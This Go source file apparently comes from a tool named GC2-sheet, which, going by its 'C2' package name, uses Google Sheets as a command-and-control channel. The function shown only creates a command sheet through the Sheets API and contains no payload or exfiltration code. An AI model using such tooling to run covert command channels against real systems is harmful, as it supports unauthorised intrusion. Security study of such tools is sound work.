package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"google.golang.org/api/sheets/v4"
)

func createSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet)  {

	sheetName := spreadSheet.CommandSheet.Name

	var requests []*sheets.Request

	request := &sheets.Request{}
	addSheetRequest := &sheets.AddSheetRequest{}
	sheetProperties := &sheets.SheetProperties{Title: sheetName}

	addSheetRequest.Properties = sheetProperties
	request.AddSheet = addSheetRequest
	requests = append(requests, request)

	batchupDateSpreadSheetRequest := &sheets.BatchUpdateSpreadsheetRequest{Requests: requests}

	_, err1 := client.Spreadsheets.BatchUpdate(spreadSheet.SpreadSheetId, batchupDateSpreadSheetRequest).Do()

	if err1 != nil {
		utils.LogFatalDebug("Error creating new sheet: " + err1.Error())
	}

}
